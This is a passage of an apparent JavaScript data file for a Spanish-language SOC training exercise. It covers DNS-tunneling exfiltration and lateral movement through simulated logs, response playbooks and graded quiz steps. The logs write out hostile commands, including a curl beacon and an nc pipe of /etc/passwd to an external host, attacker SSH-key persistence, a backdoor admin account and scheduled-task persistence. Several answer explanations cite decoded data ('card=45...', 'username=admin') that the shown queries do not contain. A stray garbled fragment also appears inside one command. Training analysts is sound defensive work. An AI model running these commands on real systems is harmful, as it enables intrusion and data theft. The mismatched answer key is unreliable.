      { line: 36, timestamp: "Aug 24 14:15:22", source: "srv-app-01 zeek.dns", message: "Query: bWFzdGVyX2tleQ.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 37, timestamp: "Aug 24 14:15:25", source: "srv-app-01 zeek.dns", message: "Query: c2Vzc2lvbl90b2tlbg.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 38, timestamp: "Aug 24 14:15:28", source: "srv-app-01 zeek.dns", message: "Query: ZGF0YWJhc2VfdXNlcnMuc3Fs.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 39, timestamp: "Aug 24 14:15:30", source: "srv-app-01 zeek.dns", message: "Query: cGF5bWVudF9nYXRld2F5X2tleQ.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 40, timestamp: "Aug 24 14:15:32", source: "srv-app-01 zeek.dns", message: "Query: YXBpX2tleV9saXZlX3Byb2QuYXBp.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 41, timestamp: "Aug 24 14:15:34", source: "srv-app-01 zeek.dns", message: "Query: c3RyaXBlX3NlY3JldF9rZXk.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 42, timestamp: "Aug 24 14:15:36", source: "srv-app-01 zeek.dns", message: "Query: YmFja3VwX2VuY3J5cHRlZF9kYXRh.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 43, timestamp: "Aug 24 14:15:38", source: "srv-app-01 zeek.dns", message: "Query: c2VydmljZV9hY2NvdW50X3B3ZA.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 44, timestamp: "Aug 24 14:15:40", source: "srv-app-01 zeek.dns", message: "Query: ZGVwbG95X3Rva2VuX3Byb2QuYXBp.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 45, timestamp: "Aug 24 14:15:42", source: "srv-app-01 zeek.dns", message: "Query: aW50ZXJuYWxfYXBpX3NlY3JldA.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 46, timestamp: "Aug 24 14:15:44", source: "srv-app-01 zeek.dns", message: "Query: Y2xpZW50X3NlY3JldF9iYXNlNjQ.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 47, timestamp: "Aug 24 14:15:46", source: "srv-app-01 zeek.dns", message: "Query: cGF5bWVudF9wcm9jZXNzb3JfY3JlZHM.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 48, timestamp: "Aug 24 14:15:48", source: "srv-app-01 zeek.dns", message: "Query: c2Vzc2lvbl9kYXRhX2V4Zmls.evil-cdn.com — Type: A — Response: 198.51.100.23 — TTL: 30", severity: "warning", flagged: true },
      { line: 49, timestamp: "Aug 24 14:16:00", source: "srv-monitor alert", message: "srv-app-01: DNS anomaly detected — 28 queries to unknown domain evil-cdn.com in 6 minutes", severity: "warning", flagged: false },
      { line: 50, timestamp: "Aug 24 14:16:30", source: "srv-app-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 51, timestamp: "Aug 24 14:17:00", source: "srv-app-01 node.app", message: "Queue processor: 98 jobs completed, 31 pending", severity: "info", flagged: false },
      { line: 52, timestamp: "Aug 24 14:18:15", source: "srv-monitor cron", message: "Health check: srv-app-01 — CPU 52% — RAM 64% — Disk 71%", severity: "info", flagged: false },
      { line: 53, timestamp: "Aug 24 14:19:30", source: "srv-app-01 nginx.access", message: "POST /api/payments/process 200 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 54, timestamp: "Aug 24 14:20:00", source: "srv-app-01 zeek.dns", message: "Query: docs.docker.com — Type: A — Response: 104.18.12.163 — TTL: 300", severity: "info", flagged: false },
      { line: 55, timestamp: "Aug 24 14:21:00", source: "srv-app-01 node.app", message: "Metric aggregation completed — 11,204 events processed — anomaly score: 87/100", severity: "info", flagged: false },
    ],
    playbook: [
      {
        id: "PB-DNS-001",
        title: "DNS Tunneling / Exfiltration — Protocolo de respuesta",
        category: "Exfiltración de datos",
        content:
          "1. Verificar si el dominio está en threat intelligence feeds\n2. Calcular volumen de consultas y tamaño estimado de datos\n3. Identificar qué datos podrían estar siendo exfiltrados\n4. Bloquear resolución DNS hacia el dominio malicioso\n5. Revisar procesos del servidor afectado (¿qué generó el tráfico?)\n6. Buscar persistencia (crontab, systemd services, .bashrc)\n7. Escalar a forense si se confirma exfiltración",
      },
      {
        id: "PB-NET-002",
        title: "Tráfico de red anómalo",
        category: "Red",
        content:
          "DNS legítimo: dominios conocidos, respuestas variadas, TTL normales\nDNS tunneling: subdominios largos/base64, mismo IP destino, TTL bajos, alto volumen\nExfiltration patterns: consultas TXT con datos codificados, subdominios que parecen hash/base64",
      },
    ],
    steps: [
      {
        id: "identify",
        title: "Paso 1 — Identificar los logs relevantes",
        description:
          "Analicé el log. ¿Qué patrón ves en las consultas DNS marcadas?",
        hint: "Fijate en el formato de los subdominios y el IP de destino.",
        options: [
          {
            id: "a",
            label:
              "Consultas DNS normales — el servidor está resolviendo CDN para assets",
            correct: false,
            explanation:
              "Los subdominios son strings base64 (aGVsbG8=, cGF5bG9hZA==, etc.), todos apuntan al mismo IP (198.51.100.23) con TTL idéntico (30s). Un CDN real tiene múltiples IPs, TTL variables y subdominios legítimos, no strings codificados.",
            consequence:
              "En un SOC real, ignorar DNS tunneling como \"tráfico normal\" permite que el atacante siga exfiltrando datos. Cada query DNS es un paquete de información robada: credenciales, tokens, datos financieros.",

          },
          {
            id: "b",
            label:
              "DNS tunneling — los subdominios contienen datos codificados en base64 exfiltrados del servidor",
            correct: true,
            explanation:
              "Correcto. Cada subdominio es base64 decodificable: 'hello world', 'payload.bin', 'token=abc123', 'secret_data', 'card=45...' El patrón de mismo destino, TTL fijo y subdominios con datos codificados es DNS tunneling clásico.",
          },
          {
            id: "c",
            label:
              "Es ruido — solo 28 consultas en 6 minutos no es significativo",
            correct: false,
            explanation:
              "El volumen no es el problema, sino el CONTENIDO. Cada subdominio lleva datos exfiltrados. Con 28 consultas ya se extrajeron: tokens, credenciales, datos de tarjetas de crédito, secrets de API. El daño ya está hecho.",
            consequence:
              "En un SOC real, subestimar el volumen de exfiltración porque \"solo son 28 consultas\" ignora que cada consulta puede contener cientos de bytes de datos robados. 28 consultas de ~200 bytes = ~5.6KB de datos sensibles filtrados.",

          },
          {
            id: "d",
            label:
              "Cache poisoning — alguien está envenenando la cache DNS del servidor",
            correct: false,
            explanation:
              "El cache poisoning implica respuestas DNS falsas. Aquí el servidor está GENERANDO las consultas (queries salientes), no recibiendo respuestas falsas. El tráfico es saliente desde srv-app-01 hacia evil-cdn.com.",
            consequence:
              "En un SOC real, confundir DNS tunneling con cache poisoning lleva a bloquear la resolución DNS incorrecta mientras el atacante sigue exfiltrando datos por un canal completamente diferente.",

          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 — Asignar el incidente",
        description:
          "¿Quién debería tomar este caso y por qué?",
        hint: "Pensá en qué servidor está afectado y quién tiene acceso de administración.",
        options: [
          {
            id: "a",
            label:
              "Lucía Fernández (Desarrolladora Backend — VLAN 20 Dev)",
            correct: false,
            explanation:
              "Lucía desarrolla en srv-app-01 pero no tiene permisos de SysAdmin. Podría ayudar a entender qué procesos de la app podrían haber generado el tráfico, pero no es la primera línea de respuesta.",
            consequence:
              "En un SOC real, asignar el incidente a un desarrollador que no tiene experiencia en seguridad retrasa la contención. Ella podría Help entender la aplicación, pero no tiene las herramientas ni el conocimiento para bloquear el dominio o aislar el servidor.",

          },
          {
            id: "b",
            label:
              "Ana Martínez (DevOps Engineer — VLAN 10 Admin)",
            correct: true,
            explanation:
              "Correcto. Ana es DevOps en VLAN 10 Admin con acceso a srv-app-01. Ella puede investigar procesos, revisar crontabs, revisar la configuración de DNS y ejecutar la contención técnica (bloquear el dominio, aislar el servidor).",
          },
          {
            id: "c",
            label:
              "Carlos Ruiz (Analista Financiero — VLAN 30 Corp)",
            correct: false,
            explanation:
              "Carlos no tiene acceso técnico a srv-app-01 ni conocimiento de infraestructura. Su involvement sería solo si se confirma que datos financieros fueron exfiltrados.",
            consequence:
              "En un SOC real, asignar un incidente de exfiltración a un analista financiero sin acceso técnico genera cuellos de botella. Carlos no puede bloquear el dominio ni revisar procesos del servidor.",

          },
          {
            id: "d",
            label:
              "El equipo de marketing",
            correct: false,
            explanation:
              "El marketing no tiene ninguna relación con la infraestructura técnica ni la seguridad de servidores.",
            consequence:
              "En un SOC real, asignar un incidente de seguridad al equipo de marketing es un error que refleja falta de comprensión de roles. El marketing no puede ejecutar ninguna acción de contención.",

          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 — Consultar el playbook",
        description:
          "Según el PB-DNS-001, ¿cuál es el segundo paso crítico después de confirmar que el dominio está en threat intel?",
        hint: "Recordá que ya identificaste el patrón de tunneling.",
        options: [
          {
            id: "a",
            label: "Apagar el servidor inmediatamente",
            correct: false,
            explanation:
              "Apagar srv-app-01 cortaría el servicio de pagos. El playbook prioriza contención quirúrgica (bloquear el dominio DNS) antes de medidas drásticas que afecten la disponibilidad.",
            consequence:
              "En un SOC real, apagar un servidor de pagos en producción causa pérdidas financieras directas por cada minuto de downtime, plus daño reputacional con clientes que dependen del servicio.",

          },
          {
            id: "b",
            label:
              "Calcular el volumen de consultas y el tamaño estimado de datos exfiltrados",
            correct: true,
            explanation:
              "Correcto. Antes de actuar, necesitás entender la magnitud: ¿cuántos datos se fueron? ¿Qué tipo de datos? Esto determina la severidad del incidente y si hay que notificar a clientes/reguladores.",
          },
          {
            id: "c",
            label:
              "Ignorar las consultas DNS — son solo 28 queries",
            correct: false,
            explanation:
              "28 consultas que contienen tokens, datos de tarjetas y credenciales NO es ruido. Cada query es un paquete de datos robados.",
            consequence:
              "En un SOC real, ignorar exfiltración activa porque \"no es significativo\" permite que el atacante robe suficientes datos para causar brechas de datos que requieren notificación regulatoria a miles de clientes.",

          },
          {
            id: "d",
            label:
              "Cambiar la contraseña de root del servidor",
            correct: false,
            explanation:
              "La contraseña de root no tiene relación directa con el DNS tunneling. El malware/exfiltrador tiene su propio mecanismo de comunicación. Cambiar la contraseña no detiene la fuga.",
            consequence:
              "En un SOC real, cambiar la contraseña de root sin aislar el dominio malicioso es como cerrar la puerta principal mientras el ladrón sale por la ventana. La exfiltración continúa por DNS mientras \"solucionás\" un problema que no existe.",

          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 — Clasificar la alerta",
        description:
          "¿Falso positivo o positivo verdadero?",
        hint: "Considerá el patrón de base64 en subdominios, el IP fijo, y los datos sensibles en las queries.",
        options: [
          {
            id: "a",
            label:
              "Falso positivo — puede ser tráfico legítimo de una librería",
            correct: false,
            explanation:
              "Ninguna librería legítima exfiltra datos vía DNS subdominios codificados en base64 hacia un dominio no registrado. Esto es activity maliciosa confirmada.",
            consequence:
              "En un SOC real, clasificar exfiltración vía DNS tunneling como falso positivo permite que el atacante robe terabytes de datos sin ser detectado. Los reguladores multan a las empresas que ignoran evidencia clara de brechas.",

          },
          {
            id: "b",
            label:
              "Positivo verdadero — Exfiltración de datos vía DNS tunneling confirmada",
            correct: true,
            explanation:
              "Correcto. Los subdominios contienen datos decodificables: tokens de sesión, datos de tarjetas de crédito (card=45...), credenciales (username=admin, password=sup...). El atacante está extrayendo información sensible del servidor de pagos.",
          },
          {
            id: "c",
            label:
              "Requiere más análisis — no hay evidencia de datos sensibles",
            correct: false,
            explanation:
              "Ya decodificaste base64 en los subdominios: 'card=45...', 'master_key', 'session_token', 'username=admin'. La evidencia de datos sensibles es clara.",
            consequence:
              "En un SOC real, pedir \"más análisis\" cuando la evidencia es clara retrasa la notificación a reguladores. El GDPR y similares requieren notificación dentro de 72 horas de confirmar la brecha.",

          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 — Redacción del reporte",
        description:
          "Escribí el reporte del incidente. ¿Cuál es la redacción correcta?",
        hint: "El reporte debe incluir: qué pasó, qué datos, impacto, y acciones.",
        options: [
          {
            id: "a",
            label:
              "Se encontró tráfico DNS raro en srv-app-01. Revisar el servidor.",
            correct: false,
            explanation:
              "Sin datos técnicos, sin IP de destino, sin descripción del patrón, sin impacto. Un reporte vacío que no permite ni escalamiento ni forense.",
            consequence:
              "En un SOC real, un reporte sin datos técnicos no permite al equipo de contención ejecutar acciones. No saben qué dominio bloquear, qué servidor revisar, ni qué datos pudieron ser comprometidos.",

          },
          {
            id: "b",
            label:
              "Exfiltración de datos vía DNS tunneling desde srv-app-01 hacia evil-cdn.com (198.51.100.23). 28 consultas DNS con subdominios base64 conteniendo: tokens de sesión, datos de tarjetas de crédito (parciales), y credenciales. Activity detectada entre 14:10–14:15 UTC. Dominio no registrado en asset inventory. Impacto: posible compromiso de datos de clientes de pagos. Acciones: bloquear evil-cdn.com en DNS, revisar procesos en srv-app-01, forense completo, notificar a DPO si se confirma fuga de datos personales.",
            correct: true,
            explanation:
              "Reporte completo: QUÉ (DNS tunneling), DESDE DÓNDE (srv-app-01 → evil-cdn.com), QUÉ DATOS (tokens, cards, credenciales), CUÁNDO, IMPACTO (datos de clientes), y ACCIONES (contención + forense + notificación regulatoria). Formato profesional SOC.",
          },
          {
            id: "c",
            label:
              "El servidor fue hackeado y están robando información por DNS. Hay que apagarlo.",
            correct: false,
            explanation:
              "Lenguaje alarmista sin datos. \'Hackeado\' no es descriptivo. \'Apagarlo\' no es una acción de contención apropiada para un servidor de pagos en producción.",
            consequence:
              "En un SOC real, reportes alarmistas sin datos generan pánico en management que lleva a decisiones erróneas: apagar servidores críticos, contactar clientes innecesariamente, o ignorar la evidencia real porque \"exageran\".",

          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 — Volver al panel",
        description:
          "Caso clasificado y reportado. ¿Qué sigue?",
        hint: "Pensá en la cadena de escalamiento.",
        options: [
          {
            id: "a",
            label:
              "Volver al panel y no hacer nada más — el reporte es suficiente",
            correct: false,
            explanation:
              "Un reporte sin seguimiento no sirve. Necesitás verificar que las acciones de contención se ejecuten y que el forense inicie.",
            consequence:
              "En un SOC real, no dar seguimiento a exfiltración activa significa que el dominio malicioso sigue resolviendo y los datos siguen saliendo. Cada hora sin bloquear = más datos robados.",

          },
          {
            id: "b",
            label:
              "Escalar a Ana para la contención técnica y volver al panel de logs para seguir monitoreando",
            correct: true,
            explanation:
              "Correcto. Escalás a Ana (DevOps) para bloquear el dominio, revisar procesos y aislar el servidor. Mientras ella ejecuta la contención, volvés al panel para detectar si hay más activity maliciosa o alertas pendientes.",
          },
          {
            id: "c",
            label:
              "Borrar los logs del servidor para que el atacante no se dé cuenta",
            correct: false,
            explanation:
              "Destruir evidencia es una falta grave. Los logs son evidencia forense y necesarios para entender el alcance del compromiso. Nunca se borran logs de un incidente.",
            consequence:
              "En un SOC real, borrar logs de un incidente de exfiltración destruye la única evidencia de qué datos fueron robados. Sin logs, no puedes determinar qué clientes fueron afectados ni cumplir con las obligaciones de notificación regulatoria.",

          },
        ],
      },
    ],
    summary:
      "Exfiltración de datos vía DNS tunneling desde srv-app-01. El atacante codifica datos sensibles (tokens, credenciales, datos de tarjetas) en subdominios base64 que se resuelven a 198.51.100.23. Dominio evil-cdn.com no registrado. Impacto: posible fuga de datos de clientes. Clasificación: POSITIVO VERDADERO — Exfiltración confirmada.",
  },
  {
    id: "lateral-movement",
    title: "Movimiento lateral desde workstation comprometida",
    severity: "critical",
    description:
      "Se detectó activity de SMB y WMI desde la workstation de Carlos Ruiz (10.10.3.22) hacia srv-db-01 (10.10.5.20). Carlos no tiene acceso a la base de datos. La workstation muestra signos de compromiso.",
    alertSource: "Zeek SMB + Wazuh Sysmon Rule 7045",
    alertTime: "2026-08-24 16:45:33 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 16:30:12", source: "srv-db-01 sshd[1801]", message: "Accepted publickey for deploy from 10.10.1.15 port 49822 ssh2", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 16:32:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/systemctl status postgresql", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 16:20:15", source: "srv-web-01 nginx.access", message: "GET /api/health 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 4, timestamp: "Aug 24 16:22:30", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 8% — RAM 42% — Disk 65%", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 16:23:45", source: "srv-db-01 postgresql", message: "checkpoint complete: wrote 842 buffers (5.1%)", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 16:25:00", source: "srv-web-01 sshd[22501]", message: "Accepted publickey for sofia from 10.10.3.10 port 49701 ssh2", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 16:26:10", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 — 10.10.3.10 — Sofía Ramírez Ops", severity: "info", flagged: false },
      { line: 8, timestamp: "Aug 24 16:27:00", source: "srv-db-01 crond", message: "CMD (/usr/local/bin/pg_backup.sh) — (root)", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 16:28:30", source: "srv-monitor cron", message: "Metric aggregation: 9,841 events — avg latency 11ms", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 16:29:45", source: "srv-web-01 node.app", message: "Queue processor: 156 jobs completed, 28 pending", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 16:35:44", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (base64 encoded command)", severity: "critical", flagged: true },
      { line: 12, timestamp: "Aug 24 16:35:48", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:445 (SMB)", severity: "critical", flagged: true },
      { line: 13, timestamp: "Aug 24 16:36:02", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.20:135 (WMI/RPC)", severity: "critical", flagged: true },
      { line: 14, timestamp: "Aug 24 16:36:15", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 IPC$ — Tree Connect", severity: "warning", flagged: true },
      { line: 15, timestamp: "Aug 24 16:36:20", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Tree Connect", severity: "critical", flagged: true },
      { line: 16, timestamp: "Aug 24 16:36:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/opt/scripts/backup_db.sh — se ejecutó desde SHARE remoto)", severity: "critical", flagged: true },
      { line: 17, timestamp: "Aug 24 16:37:00", source: "srv-monitor alert", message: "srv-db-01: CPU spike 98% — dump de PostgreSQL en curso — proceso syslog.pid desde 10.10.3.22", severity: "critical", flagged: true },
      { line: 18, timestamp: "Aug 24 16:37:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\exfil.zip (tamaño: 847MB)", severity: "critical", flagged: true },
      { line: 19, timestamp: "Aug 24 16:38:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:443 (HTTPS externo)", severity: "critical", flagged: true },
      { line: 20, timestamp: "Aug 24 16:38:15", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net user svc-backup P@ssw0rd123 /add", severity: "critical", flagged: true },
      { line: 21, timestamp: "Aug 24 16:38:25", source: "ws-carlos-01 sysmon", message: "ProcessCreate: cmd.exe /c net localgroup administrators svc-backup /add", severity: "critical", flagged: true },
      { line: 22, timestamp: "Aug 24 16:38:40", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 C$ — Tree Connect", severity: "critical", flagged: true },
      { line: 23, timestamp: "Aug 24 16:38:55", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Temp\\payload.dll (tamaño: 245KB)", severity: "critical", flagged: true },
      { line: 24, timestamp: "Aug 24 16:39:10", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'curl -s http://203.0.113.50/c2/beacon —校反連続')", severity: "critical", flagged: true },
      { line: 25, timestamp: "Aug 24 16:39:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.5.10:22 (SSH lateral attempt)", severity: "critical", flagged: true },
      { line: 26, timestamp: "Aug 24 16:40:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 200 — 10.10.3.10 — Sofía Ramírez Corp", severity: "info", flagged: false },
      { line: 27, timestamp: "Aug 24 16:42:00", source: "srv-monitor cron", message: "Health check: srv-db-01 — CPU 12% — RAM 45% — Disk 68%", severity: "info", flagged: false },
      { line: 28, timestamp: "Aug 24 16:43:15", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 — 10.10.2.44 — Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 29, timestamp: "Aug 24 16:44:00", source: "srv-web-01 node.app", message: "Queue processor: 134 jobs completed, 19 pending", severity: "info", flagged: false },
      { line: 30, timestamp: "Aug 24 16:44:30", source: "srv-db-01 postgresql", message: "LOG: checkpoint complete: wrote 621 buffers (3.8%)", severity: "info", flagged: false },
      { line: 31, timestamp: "Aug 24 16:45:00", source: "srv-web-01 sshd[22520]", message: "Accepted publickey for diego from 10.10.1.20 port 49801 ssh2", severity: "info", flagged: false },
      { line: 32, timestamp: "Aug 24 16:45:30", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 — 10.10.1.20 — Diego López SOC", severity: "info", flagged: false },
      { line: 33, timestamp: "Aug 24 16:46:00", source: "srv-monitor cron", message: "Metric aggregation: 10,203 events — avg latency 13ms", severity: "info", flagged: false },
      { line: 34, timestamp: "Aug 24 16:46:30", source: "srv-web-01 node.app", message: "SSL certificate renewal check — expires in 18 days", severity: "info", flagged: false },
      { line: 35, timestamp: "Aug 24 16:47:00", source: "srv-db-01 sshd[1810]", message: "Accepted publickey for deploy from 10.10.1.15 port 49901 ssh2", severity: "info", flagged: false },
      { line: 36, timestamp: "Aug 24 16:47:30", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 — 10.10.1.15 — Martín González Admin", severity: "info", flagged: false },
      { line: 37, timestamp: "Aug 24 16:48:00", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.88 DST=10.10.1.10 PROTO=TCP SPT=2222 DPT=22", severity: "info", flagged: false },
      { line: 38, timestamp: "Aug 24 16:48:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1000(deploy) cmd=/usr/bin/pg_dump -U app_user production_db", severity: "info", flagged: false },
      { line: 39, timestamp: "Aug 24 16:49:00", source: "srv-web-01 node.app", message: "Cache hit ratio: 91.7% — Redis memory: 312MB/512MB", severity: "info", flagged: false },
      { line: 40, timestamp: "Aug 24 16:49:30", source: "srv-web-01 nginx.access", message: "GET /api/products 200 — 10.10.3.22 — Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 41, timestamp: "Aug 24 16:50:00", source: "ws-carlos-01 sysmon", message: "ScheduledTaskCreate: schtasks /create /tn UpdateService /tr C:\\Users\\carlos\\AppData\\Temp\\payload.dll /sc daily /st 03:00", severity: "critical", flagged: true },
      { line: 42, timestamp: "Aug 24 16:50:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'crontab -l — new entry: 0 3 * * * /opt/.hidden/c2_beacon.sh')", severity: "critical", flagged: true },
      { line: 43, timestamp: "Aug 24 16:50:30", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\AppData\\Local\\Temp\\svchost.exe (tamaño: 1.2MB)", severity: "critical", flagged: true },
      { line: 44, timestamp: "Aug 24 16:50:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 postgres — Write (backup_db.sh overwritten)", severity: "critical", flagged: true },
      { line: 45, timestamp: "Aug 24 16:51:00", source: "ws-carlos-01 sysmon", message: "NetworkConnection: svchost.exe → 203.0.113.50:443 (HTTPS C2 callback)", severity: "critical", flagged: true },
      { line: 46, timestamp: "Aug 24 16:51:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'cat /etc/passwd | nc 203.0.113.50 9999')", severity: "critical", flagged: true },
      { line: 47, timestamp: "Aug 24 16:51:30", source: "ws-carlos-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (secondary payload — keylogger)", severity: "critical", flagged: true },
      { line: 48, timestamp: "Aug 24 16:51:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 D$ — Tree Connect", severity: "critical", flagged: true },
      { line: 49, timestamp: "Aug 24 16:52:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\.ssh\\authorized_keys (SSH key persistence)", severity: "critical", flagged: true },
      { line: 50, timestamp: "Aug 24 16:52:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'echo ssh-rsa AAAA...attacker_key... >> /root/.ssh/authorized_keys')", severity: "critical", flagged: true },
      { line: 51, timestamp: "Aug 24 16:52:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 10.10.1.30:443 (lateral recon — grafana server)", severity: "critical", flagged: true },
      { line: 52, timestamp: "Aug 24 16:52:45", source: "srv-db-01 zeek.smb", message: "Mapping: ws-carlos-01 (10.10.3.22) → srv-db-01 admin — Tree Connect", severity: "critical", flagged: true },
      { line: 53, timestamp: "Aug 24 16:53:00", source: "ws-carlos-01 sysmon", message: "FileCreate: C:\\Users\\carlos\\Desktop\\enum_results.txt (enumeration output)", severity: "critical", flagged: true },
      { line: 54, timestamp: "Aug 24 16:53:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=0(cmd=/bin/bash -c 'find / -perm -4000 -type f 2>/dev/null')", severity: "critical", flagged: true },
      { line: 55, timestamp: "Aug 24 16:53:30", source: "ws-carlos-01 sysmon", message: "NetworkConnection: powershell.exe → 203.0.113.50:8443 (C2 data upload — enum results)", severity: "critical", flagged: true },
    ],
    playbook: [
      {
        id: "PB-LAT-001",
        title: "Movimiento Lateral — Protocolo de respuesta",
        category: "Compromiso de estación de trabajo",
        content:
          "1. Aislar la workstation comprometida de la red ( desconectar del switch / quarantinar VLAN)\n2. Identificar alcance: ¿a qué servidores accedió? ¿qué datos expuso?\n3. BloquearIP deC2externo en firewall perimetral\n4. Revocar todas las sesiones activas del usuario afectado\n5. Obtener imagen forense de la workstation antes de apagarla\n6. Resetear credenciales de TODOS los usuarios que tengan acceso a los servidores tocados\n7. Revisar si hay persistencia en srv-db-01 (backdoors, cron jobs, usuarios CREADOS)\n8. Notificar a DPO y legal si hay datos de clientes comprometidos\n9. Escalar a management si hay impacto en servicios de pago",
      },
      {
        id: "PB-IR-002",
        title: "Criterios de escalamiento — Niveles de impacto",
        category: "Escalamiento",
        content:
          "NIVEL 1 (L2): Workstation comprometida sin acceso a servidores críticos\nNIVEL 2 (L3): Movimiento lateral a servidores internos\nNIVEL 3 (CISO): Exfiltración de datos de clientes / impacto en servicios de pago\nNIVEL 4 (Legal/DPO): Notificación regulatoria obligatoria (PDPA, GDPR, etc.)",
      },
    ],
    steps: [
      {
        id: "identify",
        title: "Paso 1 — Identificar los logs relevantes",
        description:
          "Revisá el log completo. ¿Cuáles líneas son parte del incidente de movimiento lateral?",
        hint: "Mirá las conexiones SMB, WMI, el dump de la DB, y la exfiltración.",
        options: [
          {
            id: "a",
            label:
              "Solo las líneas 11-13 (powershell.exe y sus conexiones de red)",
            correct: false,
            explanation:
              "Estás capturando el vector de ataque pero perdiendo la evidencia de lo que pasó después: el mapeo de shares SMB, la ejecución del script, el dump de la DB, la creación del zip, la exfiltración externa, y la persistencia.",
            consequence:
              "En un SOC real, reportar solo el PowerShell encoded sin la evidencia de post-explotación hace que el equipo subestime la gravedad. No sabrían que ya se robó la base de datos completa y se instaló persistencia.",

          },
          {
            id: "b",
            label:
              "Líneas 11-25 y 41-55 (desde powershell.exe hasta la exfiltración y persistencia)",
            correct: true,
            explanation:
              "Correcto. La secuencia completa es: PowerShell con encoded command → conexiones SMB/WMI → mapeo de shares → ejecución de script → dump de DB → creación de zip → exfiltración HTTPS → creación de usuario → persistencia (cron, scheduled tasks, SSH keys) → más exfiltración. Las líneas normales son activity legítima.",
          },
          {
            id: "c",
            label:
              "Todas las líneas del log (1-55)",
            correct: false,
            explanation:
              "Las líneas 1-2, 3-10, 26-40 incluyen deploy de Martin, health checks, activity de Lucía, Sofía, Carlos, y otros. Son activity normal del día. Incluirlas ensucia la evidencia y dificulta el análisis forense.",
            consequence:
              "En un SOC real, entregar 55 líneas de \"evidencia\" donde 30 son tráfico legítimo hace que el equipo de contención pierda horas revisando activity normal mientras el atacante sigue activo.",

          },
          {
            id: "d",
            label:
              "Solo la línea 17 (el CPU spike de srv-db-01)",
            correct: false,
            explanation:
              "El CPU spike es un síntoma, no la causa. Sin ver el origen (power-shell en ws-carlos), el método (SMB/WMI), la exfiltración (zip + HTTPS), y la persistencia, no podés construir el caso.",
            consequence:
